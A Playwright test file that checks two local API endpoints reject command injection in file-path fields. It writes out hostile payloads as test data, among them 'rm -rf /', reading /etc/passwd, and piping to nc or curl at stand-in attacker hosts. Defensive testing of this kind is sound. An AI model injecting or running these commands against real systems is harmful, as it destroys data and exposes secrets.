import { test, expect } from '@playwright/test';

test.describe('Security: Command Injection Prevention', () => {
  test('Visual editor rejects shell metacharacters in file paths', async ({ request }) => {
    const maliciousPayloads = [
      '"; rm -rf /; "',
      '`whoami`',
      '$(cat /etc/passwd)',
      '; ls -la',
      '| nc attacker.com 4444',
      '&& curl evil.com',
    ];
    
    for (const payload of maliciousPayloads) {
      const response = await request.post('http://localhost:5000/api/visual-editor/apply-styles', {
        data: {
          mutations: [
            {
              filePath: payload,
              oldValue: 'test',
              newValue: 'test2'
            }
          ]
        },
        headers: {
          'Content-Type': 'application/json',
        },
        failOnStatusCode: false,
      });
      
      // Should reject with 400 or 500 error, never 200 success
      expect(response.status()).not.toBe(200);
      
      const body = await response.json();
      console.log(`✓ Rejected payload: ${payload.substring(0, 20)}...`);
      expect(body.error || body.message).toBeTruthy();
    }
  });
  
  test('Vibe execute rejects command injection in file operations', async ({ request }) => {
    const response = await request.post('http://localhost:5000/api/vibe/execute', {
      data: {
        changes: [
          {
            file: '"; rm -rf /; "',
            operation: 'edit',
            content: 'malicious'
          }
        ]
      },
      headers: {
        'Content-Type': 'application/json',
      },
      failOnStatusCode: false,
    });
    
    expect(response.status()).not.toBe(200);
    console.log('✓ Vibe execute rejected command injection attempt');
  });
});
